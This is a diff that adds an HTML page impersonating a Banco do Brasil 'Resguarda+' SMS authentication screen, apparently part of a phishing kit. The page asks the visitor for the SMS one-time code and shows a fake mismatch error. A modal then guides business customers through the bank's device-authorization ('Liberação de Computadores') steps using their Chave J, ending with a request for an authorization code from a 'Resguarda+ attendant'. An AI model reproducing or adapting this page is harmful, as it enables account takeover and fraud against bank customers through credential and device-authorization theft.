@@ -1,0 +1,115 @@
+<!doctype html>
+<html class="no-js" lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <title>BB - Autenticação</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1"> 
+		<link rel="shortcut icon" type="image/x-icon" href="#">
+        <!-- Place favicon.ico in the root directory -->
+        
+		<!-- CSS here -->
+        <link rel="stylesheet" href="assets/css/bootstrap.min.css"> 
+        <link rel="stylesheet" href="assets/css/style.css">
+        <link rel="stylesheet" href="assets/css/responsive.css">
+    </head>
+    <body>
+
+       
+    <!-- header-area START -->
+    <div class="header-area">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class=" col-6">
+                    <div class="logo-area">
+                        <a href="index.html"><img src="assets/img/logo.svg" alt=""></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- header-area END -->
+
+
+    <main>
+        
+
+
+        <!---------login Section START ---------->
+        <section class="login-area">
+            <div class="position-img">
+                <img src="assets/img/log-1.svg" class="shape-top" alt="">
+                <img src="assets/img/log-2.svg" class="shape-btm" alt="">
+            </div>
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="login_content">
+                            <div class="logo">
+                                <a href="#">
+                                    <img src="assets/img/logo-v1.svg" alt="">
+                                </a>
+                            </div>
+                            <h2 class="title mb-5">Autenticação <span>Resguarda<i>+</i></span> </h2>
+                        </div>
+                    </div>
+                    <div class="col-lg-12 mb_100 ">
+                        <div class="login-form lg ">
+                            <span class="mb-5 text-center d-block">A fim de garantir a máxima segurança de seus dados no Resguarda, solicitamos que insira o código de autenticação enviado via SMS ao seu número de telefone cadastrado.                            </span>
+                            <form action="" class="needs-validation" novalidate">
+                                <div class="input_blk">
+                                    <input type="text" placeholder="Digite o código SMS" class="form-control" id="validationCustom03" required>
+                                </div>
+                                <span class="log-worn">*O código SMS inserido não corresponde ao enviado pelo Banco do Brasil. Por favor, verifique e tente novamente.</span>
+                                <button type="submit" class="thm_btn log_btn">Confirmar</button>
+                                <h6 class="SMS-link">Não recebeu o SMS? <a href="#" data-bs-toggle="modal" data-bs-target="#Equipamento">Reenviar código</a></h6>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="col-lg-12">
+                        <div class="SMS_text">
+                            <span>Em caso de dúvidas ou problemas, por favor, contate o suporte da PGFN ou do Banco do Brasil para assistência.</span>
+                            <a href="#">Problemas com o recebimento do SMS?</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!---------login Section End ---------->
+
+        <!-- Modal -->
+        <div class="modal fade" id="Equipamento" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered modal-lg">
+            <div class="modal-content">
+                <div class="Equipamento_content">
+                    <h3>Instruções para Liberação de Equipamento</h3>
+                    <ul>
+                        <li>1. Acesse sua conta PJ no portal https://www.bb.com.br/. </li>
+                        <li>2. No menu à esquerda, localize e clique em Segurança e Gerenciamento.</li>
+                        <li>3. No submenu que aparece, selecione Cadastrar Equipamento. </li>
+                        <li>4. Agora, clique na opção Liberação de Computadores.</li>
+                        <li>5. Aqui, utilize sua Chave J para autenticação.</li>
+                        <li>6. Depois de autenticado, procure pelo nome do seu dispositivo. </li>
+                        <li>7. Após a confirmação, solicite ao seu atendente do Resguarda+ o código de autorização para finalizar o processo.</li>
+                    </ul>
+                    <a href="#" class="thm_btn" data-bs-dismiss="modal">
+                        Fechar
+                    </a>
+                </div>
+            </div>
+            </div>
+        </div>
+
+    </main>
+
+    
+		<!-- JS here --> 
+        <script src="assets/js/jquery-3.4.1.min.js"></script>
+        <script src="assets/js/popper.min.js"></script>
+        <script src="assets/js/bootstrap.min.js"></script>
+        <script src="assets/js/main.js"></script>
+
+    </body>
+</html>
+
